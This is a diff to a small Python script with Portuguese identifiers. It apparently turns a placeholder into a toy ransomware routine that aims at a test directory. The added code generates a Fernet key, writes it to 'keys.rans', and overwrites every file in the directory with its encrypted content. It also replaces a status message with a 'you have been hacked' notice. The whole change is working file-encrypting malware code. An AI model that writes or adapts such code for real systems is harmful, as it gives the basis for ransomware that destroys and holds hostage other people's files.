@@ -1,6 +1,8 @@
 import os
 import shutil
 
+from cryptography.fernet import Fernet
+
 
 def garanta_existencia_diretorio(diretorio: str) -> None:
     diretorio_exemplos: str = './exemplos'
@@ -16,7 +18,21 @@ def garanta_existencia_diretorio(diretorio: str) -> None:
 
 
 def criptografe_diretorio(diretorio: str) -> None:
-    print(f'Criptografando diretório {diretorio}...')
+    key = Fernet.generate_key()
+
+    with open(f'{diretorio}/keys.rans', 'wb') as filekey:
+        filekey.write(key)
+
+    for nome_arquivo in os.listdir(diretorio):
+        caminho_arquivo = f'{diretorio}/{nome_arquivo}'
+        with open(caminho_arquivo, 'rb') as arquivo:
+            texto = arquivo.read()
+
+        f = Fernet(key)
+        texto_criptografado = f.encrypt(texto)
+
+        with open(caminho_arquivo, 'wb') as arquivo:
+            arquivo.write(texto_criptografado)
 
 
 def descriptografe_diretorio(diretorio: str) -> None:
@@ -40,7 +56,7 @@ if __name__ == '__main__':
         if opcao == 1:
             garanta_existencia_diretorio(DIRETORIO_TESTE)
             criptografe_diretorio(DIRETORIO_TESTE)
-            print('Criptografando...')
+            print(f'Você foi hackeado! Todos os arquivos do diretório {DIRETORIO_TESTE} foram criptografados!')
         elif opcao == 2:
             descriptografe_diretorio(DIRETORIO_TESTE)
             print('Descriptografando...')
